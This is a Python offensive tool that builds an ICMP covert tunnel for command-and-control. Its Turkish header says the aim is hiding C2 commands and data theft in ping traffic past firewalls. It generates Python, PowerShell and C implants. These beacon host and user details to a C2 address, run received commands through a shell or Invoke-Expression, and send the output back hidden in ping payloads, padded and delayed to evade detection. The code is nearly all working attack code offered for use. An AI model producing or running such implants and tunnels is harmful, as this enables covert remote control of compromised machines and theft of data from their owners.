#!/usr/bin/env python3
"""
ICMP Tunneling (Ping Channel)
=============================
Çoğu şirket ping atmayı yasaklamaz!
ICMP Echo Request/Reply paketlerinin data kısmında gizli trafik.

Firewall: "Birisi sadece ping atıyor, zararsız..."
Gerçek: C2 komutları ve veri sızıntısı

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import os
import struct
import socket
import secrets
import hashlib
import base64
import time
import json
import threading
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from enum import Enum
import select


class ICMPType(Enum):
    """ICMP message types"""
    ECHO_REPLY = 0
    ECHO_REQUEST = 8
    TIMESTAMP_REQUEST = 13
    TIMESTAMP_REPLY = 14
    INFO_REQUEST = 15
    INFO_REPLY = 16


class TunnelMode(Enum):
    """ICMP tunnel operation modes"""
    HALF_DUPLEX = "half"  # Data only in Echo Request
    FULL_DUPLEX = "full"  # Data in both Request and Reply
    COVERT_SIZE = "covert_size"  # Data encoded in packet sizes
    COVERT_TIMING = "covert_timing"  # Data encoded in timing


@dataclass
class ICMPPacket:
    """ICMP packet structure"""
    icmp_type: int
    code: int
    checksum: int
    identifier: int
    sequence: int
    payload: bytes
    timestamp: float = field(default_factory=time.time)
    
    def to_bytes(self) -> bytes:
        """Convert to raw ICMP packet"""
        # Header without checksum
        header = struct.pack(
            "!BBHHH",
            self.icmp_type,
            self.code,
            0,  # Checksum placeholder
            self.identifier,
            self.sequence
        )
        
        # Calculate checksum
        packet = header + self.payload
        checksum = self._calculate_checksum(packet)
        
        # Header with checksum
        header = struct.pack(
            "!BBHHH",
            self.icmp_type,
            self.code,
            checksum,
            self.identifier,
            self.sequence
        )
        
        return header + self.payload
    
    @staticmethod
    def _calculate_checksum(data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            total += word
        
        while total >> 16:
            total = (total & 0xFFFF) + (total >> 16)
        
        return ~total & 0xFFFF
    
    @classmethod
    def from_bytes(cls, data: bytes) -> 'ICMPPacket':
        """Parse ICMP packet from raw bytes"""
        if len(data) < 8:
            raise ValueError("Packet too short")
        
        icmp_type, code, checksum, identifier, sequence = struct.unpack(
            "!BBHHH", data[:8]
        )
        
        return cls(
            icmp_type=icmp_type,
            code=code,
            checksum=checksum,
            identifier=identifier,
            sequence=sequence,
            payload=data[8:]
        )
    
    def to_dict(self) -> Dict:
        return {
            "type": self.icmp_type,
            "code": self.code,
            "identifier": self.identifier,
            "sequence": self.sequence,
            "payload_size": len(self.payload),
            "timestamp": self.timestamp
        }


@dataclass
class TunnelSession:
    """ICMP tunnel session"""
    session_id: str
    target_ip: str
    identifier: int  # ICMP identifier for this session
    encryption_key: bytes
    mode: TunnelMode = TunnelMode.FULL_DUPLEX
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_activity: Optional[str] = None
    packets_sent: int = 0
    packets_received: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    active: bool = True
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "target_ip": self.target_ip,
            "identifier": self.identifier,
            "mode": self.mode.value,
            "created_at": self.created_at,
            "last_activity": self.last_activity,
            "packets_sent": self.packets_sent,
            "packets_received": self.packets_received,
            "bytes_sent": self.bytes_sent,
            "bytes_received": self.bytes_received,
            "active": self.active
        }


@dataclass
class TunnelMessage:
    """Message transmitted through ICMP tunnel"""
    message_id: str
    message_type: str  # cmd, response, data, beacon
    payload: bytes
    sequence: int = 0
    total_chunks: int = 1
    flags: int = 0  # 0x01=encrypted, 0x02=compressed, 0x04=more_fragments
    checksum: str = ""
    
    # Header format: 4 bytes
    # [1 byte type][1 byte flags][2 bytes seq/total]
    HEADER_SIZE = 4
    
    def __post_init__(self):
        if not self.checksum:
            self.checksum = hashlib.md5(self.payload).hexdigest()[:8]
    
    def pack(self) -> bytes:
        """Pack message into bytes for ICMP payload"""
        type_byte = {
            "cmd": 0x01,
            "response": 0x02,
            "data": 0x03,
            "beacon": 0x04
        }.get(self.message_type, 0x00)
        
        # Combine seq and total into 2 bytes
        seq_total = (self.sequence << 8) | (self.total_chunks & 0xFF)
        
        header = struct.pack("!BBH", type_byte, self.flags, seq_total)
        return header + self.payload
    
    @classmethod
    def unpack(cls, data: bytes) -> 'TunnelMessage':
        """Unpack message from ICMP payload"""
        if len(data) < cls.HEADER_SIZE:
            raise ValueError("Data too short")
        
        type_byte, flags, seq_total = struct.unpack("!BBH", data[:4])
        
        type_map = {
            0x01: "cmd",
            0x02: "response",
            0x03: "data",
            0x04: "beacon"
        }
        
        return cls(
            message_id=secrets.token_hex(8),
            message_type=type_map.get(type_byte, "data"),
            payload=data[cls.HEADER_SIZE:],
            sequence=seq_total >> 8,
            total_chunks=seq_total & 0xFF,
            flags=flags
        )


class ICMPTunnel:
    """
    ICMP Tunneling for Covert C2 Communication
    ==========================================
    
    Hides command and control traffic in ICMP Echo Request/Reply packets.
    Most firewalls allow ICMP for network diagnostics (ping).
    
    Features:
    - Data hidden in ICMP payload (looks like random ping data)
    - AES-256 encryption
    - Fragmentation for large data
    - Multiple covert modes (timing, size, payload)
    - Session management
    """
    
    # Standard ICMP payload sizes (to blend in)
    STANDARD_SIZES = [56, 64, 84, 128, 256, 512, 1024]
    
    # Maximum ICMP payload (MTU - IP header - ICMP header)
    MAX_PAYLOAD = 1472  # 1500 - 20 - 8
    
    # Magic bytes for identifying tunnel packets
    MAGIC = b'\xDE\xAD\xBE\xEF'
    
    def __init__(self, mode: TunnelMode = TunnelMode.FULL_DUPLEX):
        self.mode = mode
        self.sessions: Dict[str, TunnelSession] = {}
        self._encryption_key: Optional[bytes] = None
        self._socket: Optional[socket.socket] = None
        self._running = False
        self._receiver_thread: Optional[threading.Thread] = None
        self._received_packets: List[ICMPPacket] = []
        self._packet_callback: Optional[callable] = None
    
    def set_encryption_key(self, key: bytes):
        """Set encryption key"""
        if len(key) != 32:
            key = hashlib.sha256(key).digest()
        self._encryption_key = key
    
    def _create_raw_socket(self) -> socket.socket:
        """Create raw socket for ICMP"""
        try:
            # ICMP raw socket (requires root)
            sock = socket.socket(
                socket.AF_INET,
                socket.SOCK_RAW,
                socket.IPPROTO_ICMP
            )
            sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 0)
            sock.settimeout(5.0)
            return sock
        except PermissionError:
            raise PermissionError("ICMP tunnel requires root privileges")
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """XOR encryption (fallback)"""
        if not self._encryption_key:
            return data
        
        key = self._encryption_key
        result = bytearray(len(data))
        for i, byte in enumerate(data):
            result[i] = byte ^ key[i % len(key)]
        return bytes(result)
    
    def _encrypt_payload(self, data: bytes) -> bytes:
        """Encrypt payload"""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            if not self._encryption_key:
                return data
            
            nonce = secrets.token_bytes(12)
            aesgcm = AESGCM(self._encryption_key)
            ciphertext = aesgcm.encrypt(nonce, data, None)
            
            return nonce + ciphertext
        except ImportError:
            return self._xor_encrypt(data)
    
    def _decrypt_payload(self, data: bytes) -> bytes:
        """Decrypt payload"""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            if not self._encryption_key:
                return data
            
            nonce = data[:12]
            ciphertext = data[12:]
            
            aesgcm = AESGCM(self._encryption_key)
            return aesgcm.decrypt(nonce, ciphertext, None)
        except ImportError:
            return self._xor_encrypt(data)
    
    def build_tunnel_packet(self, session: TunnelSession, message: TunnelMessage) -> ICMPPacket:
        """Build ICMP packet with hidden message"""
        # Pack and encrypt message
        packed = message.pack()
        encrypted = self._encrypt_payload(packed)
        
        # Add magic header for identification
        payload = self.MAGIC + encrypted
        
        # Pad to standard size (stealth)
        target_size = min(
            s for s in self.STANDARD_SIZES if s >= len(payload)
        ) if len(payload) < self.STANDARD_SIZES[-1] else len(payload)
        
        if len(payload) < target_size:
            payload += secrets.token_bytes(target_size - len(payload))
        
        # Create ICMP Echo Request
        return ICMPPacket(
            icmp_type=ICMPType.ECHO_REQUEST.value,
            code=0,
            checksum=0,
            identifier=session.identifier,
            sequence=message.sequence,
            payload=payload
        )
    
    def parse_tunnel_packet(self, packet: ICMPPacket) -> Optional[TunnelMessage]:
        """Extract hidden message from ICMP packet"""
        payload = packet.payload
        
        # Check magic header
        if not payload.startswith(self.MAGIC):
            return None
        
        # Remove magic and padding
        encrypted = payload[len(self.MAGIC):]
        
        try:
            decrypted = self._decrypt_payload(encrypted)
            return TunnelMessage.unpack(decrypted)
        except Exception:
            return None
    
    def create_session(self, target_ip: str) -> TunnelSession:
        """Create new ICMP tunnel session"""
        session_id = secrets.token_hex(16)
        identifier = secrets.randbelow(65535)
        key = secrets.token_bytes(32)
        
        session = TunnelSession(
            session_id=session_id,
            target_ip=target_ip,
            identifier=identifier,
            encryption_key=key,
            mode=self.mode
        )
        
        self.sessions[session_id] = session
        return session
    
    def send_packet(self, session: TunnelSession, message: TunnelMessage) -> bool:
        """Send ICMP tunnel packet"""
        packet = self.build_tunnel_packet(session, message)
        
        try:
            if not self._socket:
                self._socket = self._create_raw_socket()
            
            raw_packet = packet.to_bytes()
            self._socket.sendto(raw_packet, (session.target_ip, 0))
            
            # Update session stats
            session.packets_sent += 1
            session.bytes_sent += len(raw_packet)
            session.last_activity = datetime.now().isoformat()
            
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False
    
    def receive_packet(self, timeout: float = 5.0) -> Optional[Tuple[str, ICMPPacket]]:
        """Receive ICMP packet"""
        try:
            if not self._socket:
                self._socket = self._create_raw_socket()
            
            self._socket.settimeout(timeout)
            
            # Read with select for non-blocking
            ready = select.select([self._socket], [], [], timeout)
            if not ready[0]:
                return None
            
            data, addr = self._socket.recvfrom(65535)
            
            # Skip IP header (usually 20 bytes)
            ip_header_len = (data[0] & 0x0F) * 4
            icmp_data = data[ip_header_len:]
            
            packet = ICMPPacket.from_bytes(icmp_data)
            return (addr[0], packet)
            
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[!] Receive error: {e}")
            return None
    
    def chunk_data(self, data: bytes, chunk_size: int = 1000) -> List[TunnelMessage]:
        """Split large data into chunks"""
        message_id = secrets.token_hex(8)
        total_chunks = (len(data) + chunk_size - 1) // chunk_size
        
        messages = []
        for i in range(total_chunks):
            chunk = data[i * chunk_size:(i + 1) * chunk_size]
            
            flags = 0x01  # encrypted
            if i < total_chunks - 1:
                flags |= 0x04  # more fragments
            
            msg = TunnelMessage(
                message_id=message_id,
                message_type="data",
                payload=chunk,
                sequence=i,
                total_chunks=total_chunks,
                flags=flags
            )
            messages.append(msg)
        
        return messages
    
    def send_data(self, session: TunnelSession, data: bytes, delay: float = 0.1) -> int:
        """Send data through ICMP tunnel"""
        messages = self.chunk_data(data)
        sent = 0
        
        for msg in messages:
            if self.send_packet(session, msg):
                sent += 1
            time.sleep(delay)  # Avoid detection
        
        return sent
    
    def create_beacon_message(self, system_info: Dict = None) -> TunnelMessage:
        """Create beacon message"""
        beacon_data = {
            "type": "beacon",
            "timestamp": datetime.now().isoformat()
        }
        
        if system_info:
            beacon_data["system"] = system_info
        
        return TunnelMessage(
            message_id=secrets.token_hex(8),
            message_type="beacon",
            payload=json.dumps(beacon_data).encode()
        )
    
    def create_command_message(self, command: str, args: Dict = None) -> TunnelMessage:
        """Create command message"""
        cmd_data = {
            "cmd": command,
            "args": args or {},
            "timestamp": datetime.now().isoformat()
        }
        
        return TunnelMessage(
            message_id=secrets.token_hex(8),
            message_type="cmd",
            payload=json.dumps(cmd_data).encode()
        )
    
    def generate_implant_code(self, session: TunnelSession, language: str = "python") -> str:
        """Generate ICMP tunnel implant"""
        if language == "python":
            return self._generate_python_implant(session)
        elif language == "powershell":
            return self._generate_powershell_implant(session)
        elif language == "c":
            return self._generate_c_implant(session)
        else:
            return self._generate_python_implant(session)
    
    def _generate_python_implant(self, session: TunnelSession) -> str:
        """Generate Python ICMP implant"""
        key_b64 = base64.b64encode(session.encryption_key).decode()
        
        return f'''#!/usr/bin/env python3
# ICMP Tunnel Implant - Session: {session.session_id[:8]}
# Requires: root/administrator privileges

import socket
import struct
import secrets
import time
import json
import base64
import os
import platform

C2_IP = "{session.target_ip}"
SESSION_ID = "{session.session_id}"
IDENTIFIER = {session.identifier}
KEY = base64.b64decode("{key_b64}")
BEACON_INTERVAL = 30
MAGIC = b'\\xDE\\xAD\\xBE\\xEF'

def xor_crypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def calculate_checksum(data):
    if len(data) % 2:
        data += b'\\x00'
    total = sum(struct.unpack("!H", data[i:i+2])[0] for i in range(0, len(data), 2))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF

def build_icmp(identifier, sequence, payload):
    header = struct.pack("!BBHHH", 8, 0, 0, identifier, sequence)
    packet = header + payload
    checksum = calculate_checksum(packet)
    header = struct.pack("!BBHHH", 8, 0, checksum, identifier, sequence)
    return header + payload

def send_icmp(sock, dst_ip, data, seq=0):
    encrypted = xor_crypt(data, KEY)
    payload = MAGIC + encrypted
    # Pad to 64 bytes
    if len(payload) < 64:
        payload += secrets.token_bytes(64 - len(payload))
    packet = build_icmp(IDENTIFIER, seq, payload)
    sock.sendto(packet, (dst_ip, 0))

def receive_icmp(sock, timeout=5):
    sock.settimeout(timeout)
    try:
        data, addr = sock.recvfrom(65535)
        # Skip IP header
        ip_hlen = (data[0] & 0x0F) * 4
        icmp_data = data[ip_hlen:]
        if len(icmp_data) > 8:
            icmp_type = icmp_data[0]
            identifier = struct.unpack("!H", icmp_data[4:6])[0]
            payload = icmp_data[8:]
            if icmp_type == 0 and identifier == IDENTIFIER:  # Echo Reply
                if payload.startswith(MAGIC):
                    decrypted = xor_crypt(payload[4:], KEY)
                    return decrypted
    except:
        pass
    return None

def get_system_info():
    return {{
        "hostname": platform.node(),
        "user": os.getenv("USER", os.getenv("USERNAME", "?")),
        "os": platform.system(),
        "arch": platform.machine()
    }}

def beacon(sock):
    info = get_system_info()
    data = json.dumps({{"t": "beacon", "s": SESSION_ID[:8], "i": info}}).encode()
    send_icmp(sock, C2_IP, data)
    return receive_icmp(sock)

def execute_command(cmd):
    import subprocess
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
        return result.stdout + result.stderr
    except:
        return b"Error executing command"

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] Root required for raw sockets")
        return
    
    print("[*] ICMP Tunnel started")
    seq = 0
    
    while True:
        try:
            response = beacon(sock)
            if response:
                try:
                    cmd_data = json.loads(response.split(b'\\x00')[0])
                    if "cmd" in cmd_data:
                        result = execute_command(cmd_data["cmd"])
                        # Send result back
                        for i in range(0, len(result), 1000):
                            chunk = result[i:i+1000]
                            send_icmp(sock, C2_IP, chunk, seq)
                            seq = (seq + 1) % 65535
                            time.sleep(0.5)
                except:
                    pass
            
            time.sleep(BEACON_INTERVAL + secrets.randbelow(10))
        except KeyboardInterrupt:
            break
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
'''
    
    def _generate_powershell_implant(self, session: TunnelSession) -> str:
        """Generate PowerShell ICMP implant"""
        key_b64 = base64.b64encode(session.encryption_key).decode()
        
        return f'''# ICMP Tunnel Implant - PowerShell
# Requires: Administrator privileges

$C2_IP = "{session.target_ip}"
$SESSION_ID = "{session.session_id}"
$IDENTIFIER = {session.identifier}
$KEY = [Convert]::FromBase64String("{key_b64}")
$MAGIC = [byte[]]@(0xDE, 0xAD, 0xBE, 0xEF)

Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;

public class ICMPTunnel {{
    public static byte[] SendPing(string ip, byte[] data) {{
        using (Ping ping = new Ping()) {{
            try {{
                PingReply reply = ping.Send(ip, 5000, data);
                if (reply.Status == IPStatus.Success) {{
                    return reply.Buffer;
                }}
            }} catch {{ }}
            return null;
        }}
    }}
}}
"@

function XOR-Crypt($data, $key) {{
    $result = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {{
        $result[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }}
    return $result
}}

function Send-ICMP($data) {{
    $encrypted = XOR-Crypt $data $KEY
    $payload = $MAGIC + $encrypted
    # Pad to 64 bytes
    if ($payload.Length -lt 64) {{
        $padding = New-Object byte[] (64 - $payload.Length)
        [System.Security.Cryptography.RandomNumberGenerator]::Fill($padding)
        $payload = $payload + $padding
    }}
    return [ICMPTunnel]::SendPing($C2_IP, $payload)
}}

function Receive-ICMP($response) {{
    if ($response -and $response.Length -gt 4) {{
        if ($response[0] -eq 0xDE -and $response[1] -eq 0xAD) {{
            $encrypted = $response[4..($response.Length-1)]
            return XOR-Crypt $encrypted $KEY
        }}
    }}
    return $null
}}

function Get-SystemInfo {{
    return @{{
        hostname = $env:COMPUTERNAME
        user = $env:USERNAME
        os = "Windows"
        arch = $env:PROCESSOR_ARCHITECTURE
    }}
}}

function Beacon {{
    $info = Get-SystemInfo
    $data = @{{t = "beacon"; s = $SESSION_ID.Substring(0,8); i = $info}} | ConvertTo-Json -Compress
    $response = Send-ICMP ([System.Text.Encoding]::UTF8.GetBytes($data))
    return Receive-ICMP $response
}}

Write-Host "[*] ICMP Tunnel started"

while ($true) {{
    try {{
        $response = Beacon
        if ($response) {{
            try {{
                $cmd_data = [System.Text.Encoding]::UTF8.GetString($response) | ConvertFrom-Json
                if ($cmd_data.cmd) {{
                    $result = Invoke-Expression $cmd_data.cmd 2>&1 | Out-String
                    $resultBytes = [System.Text.Encoding]::UTF8.GetBytes($result)
                    Send-ICMP $resultBytes
                }}
            }} catch {{ }}
        }}
        Start-Sleep -Seconds (30 + (Get-Random -Maximum 10))
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
    
    def _generate_c_implant(self, session: TunnelSession) -> str:
        """Generate C ICMP implant"""
        key_hex = session.encryption_key.hex()
        
        return f'''/* ICMP Tunnel Implant - C */
/* Compile: gcc -o icmp_implant icmp_implant.c */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define C2_IP "{session.target_ip}"
#define IDENTIFIER {session.identifier}
#define BEACON_INTERVAL 30
#define MAX_PAYLOAD 1024

unsigned char KEY[] = "{{{', '.join(f'0x{key_hex[i:i+2]}' for i in range(0, 64, 2))}}}";
unsigned char MAGIC[] = {{0xDE, 0xAD, 0xBE, 0xEF}};

void xor_crypt(unsigned char *data, int len, unsigned char *key, int key_len) {{
    for (int i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

unsigned short checksum(void *data, int len) {{
    unsigned short *ptr = data;
    unsigned long sum = 0;
    
    while (len > 1) {{
        sum += *ptr++;
        len -= 2;
    }}
    if (len == 1) {{
        sum += *(unsigned char *)ptr;
    }}
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}}

int send_icmp(int sock, const char *dst, unsigned char *data, int len) {{
    struct sockaddr_in addr;
    unsigned char packet[sizeof(struct icmphdr) + MAX_PAYLOAD];
    struct icmphdr *icmp = (struct icmphdr *)packet;
    
    memset(packet, 0, sizeof(packet));
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(IDENTIFIER);
    icmp->un.echo.sequence = htons(0);
    
    // Add magic + encrypted data
    memcpy(packet + sizeof(struct icmphdr), MAGIC, 4);
    xor_crypt(data, len, KEY, 32);
    memcpy(packet + sizeof(struct icmphdr) + 4, data, len);
    
    int total_len = sizeof(struct icmphdr) + 4 + len;
    icmp->checksum = checksum(packet, total_len);
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(dst);
    
    return sendto(sock, packet, total_len, 0, (struct sockaddr *)&addr, sizeof(addr));
}}

int main() {{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {{
        perror("Socket creation failed (need root)");
        return 1;
    }}
    
    printf("[*] ICMP Tunnel started\\n");
    
    while (1) {{
        // Beacon
        char beacon[256];
        snprintf(beacon, sizeof(beacon), "{{\\"t\\":\\"beacon\\",\\"h\\":\\"%s\\"}}", "host");
        send_icmp(sock, C2_IP, (unsigned char *)beacon, strlen(beacon));
        
        // TODO: Receive and parse commands
        
        sleep(BEACON_INTERVAL + (rand() % 10));
    }}
    
    close(sock);
    return 0;
}}
'''
    
    def simulate_traffic(self, num_packets: int = 10) -> List[Dict]:
        """Simulate ICMP tunnel traffic for demo"""
        results = []
        
        for i in range(num_packets):
            # Simulate different payload sizes
            payload_size = secrets.choice(self.STANDARD_SIZES)
            
            results.append({
                "packet_num": i + 1,
                "type": "Echo Request" if i % 2 == 0 else "Echo Reply",
                "payload_size": payload_size,
                "contains_data": secrets.randbelow(100) < 30,  # 30% have hidden data
                "timestamp": datetime.now().isoformat()
            })
        
        return results
    
    def get_statistics(self) -> Dict:
        """Get tunnel statistics"""
        active_sessions = sum(1 for s in self.sessions.values() if s.active)
        total_packets = sum(s.packets_sent + s.packets_received for s in self.sessions.values())
        total_bytes = sum(s.bytes_sent + s.bytes_received for s in self.sessions.values())
        
        return {
            "mode": self.mode.value,
            "total_sessions": len(self.sessions),
            "active_sessions": active_sessions,
            "total_packets": total_packets,
            "total_bytes": total_bytes,
            "socket_active": self._socket is not None
        }


# Singleton instance
_icmp_tunnel = None

def get_icmp_tunnel(mode: TunnelMode = TunnelMode.FULL_DUPLEX) -> ICMPTunnel:
    """Get ICMP tunnel instance"""
    global _icmp_tunnel
    if _icmp_tunnel is None:
        _icmp_tunnel = ICMPTunnel(mode)
    return _icmp_tunnel


def demo():
    """Demonstrate ICMP tunnel capabilities"""
    print("=" * 60)
    print("ICMP Tunneling (Ping Channel)")
    print("=" * 60)
    
    print("\n[*] Tunnel Modes:")
    for mode in TunnelMode:
        print(f"    - {mode.name}: {mode.value}")
    
    tunnel = get_icmp_tunnel(TunnelMode.FULL_DUPLEX)
    
    print(f"\n[*] Configuration:")
    print(f"    Mode: {tunnel.mode.value}")
    print(f"    Max Payload: {tunnel.MAX_PAYLOAD} bytes")
    print(f"    Standard Sizes: {tunnel.STANDARD_SIZES}")
    
    # Create session
    session = tunnel.create_session("192.168.1.100")
    print(f"\n[*] Session Created:")
    print(f"    Session ID: {session.session_id}")
    print(f"    Target: {session.target_ip}")
    print(f"    ICMP ID: {session.identifier}")
    
    # Create beacon message
    beacon = tunnel.create_beacon_message({"hostname": "VICTIM-PC"})
    print(f"\n[*] Beacon Message:")
    print(f"    Type: {beacon.message_type}")
    print(f"    Payload size: {len(beacon.payload)} bytes")
    
    print("\n[*] How it appears to IDS:")
    print("    → ICMP Echo Request (Type 8)")
    print("    → Normal ping traffic to external IP")
    print("    → Payload: 64 bytes (standard ping size)")
    print("    → Hidden: Encrypted C2 data in payload")
    
    print("\n[*] Simulated Traffic:")
    traffic = tunnel.simulate_traffic(5)
    for pkt in traffic:
        hidden = "🔴 C2 DATA" if pkt["contains_data"] else "✓ Normal"
        print(f"    [{pkt['packet_num']}] {pkt['type']} - {pkt['payload_size']}B - {hidden}")
    
    print("\n[*] Python Implant Preview:")
    print("-" * 40)
    implant = tunnel.generate_implant_code(session, "python")
    print(implant[:600] + "...")
    
    print("\n[*] Ready for covert ping tunnel")
    print("-" * 60)


if __name__ == "__main__":
    demo()
